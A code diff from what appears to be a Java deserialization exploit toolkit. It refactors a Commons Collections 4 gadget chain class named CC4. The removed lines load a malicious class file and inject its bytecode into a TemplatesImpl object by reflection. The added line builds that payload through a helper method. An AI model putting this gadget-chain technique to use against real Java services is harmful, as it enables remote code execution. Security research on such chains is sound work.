@@ -10,7 +10,6 @@ import org.apache.commons.collections4.functors.InstantiateTransformer;
 import org.su18.serialize.yoserial.Utils.SerializeUtil;
 
 import javax.xml.transform.Templates;
-import java.io.InputStream;
 import java.lang.reflect.Field;
 import java.util.PriorityQueue;
 
@@ -23,20 +22,8 @@ public class CC4 {
 
 	public static void main(String[] args) throws Exception {
 
-		// 读取恶意类 bytes[]
-		InputStream inputStream = CC4.class.getResourceAsStream("../../../test/EvilClass.class");
-		byte[]      bytes       = new byte[inputStream.available()];
-		inputStream.read(bytes);
-
-		// 初始化 TemplatesImpl 对象
-		TemplatesImpl tmpl      = new TemplatesImpl();
-		Field         bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
-		bytecodes.setAccessible(true);
-		bytecodes.set(tmpl, new byte[][]{bytes});
-		// _name 不能为空
-		Field name = TemplatesImpl.class.getDeclaredField("_name");
-		name.setAccessible(true);
-		name.set(tmpl, "su18");
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
 
 		// 结合 ChainedTransformer
 		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
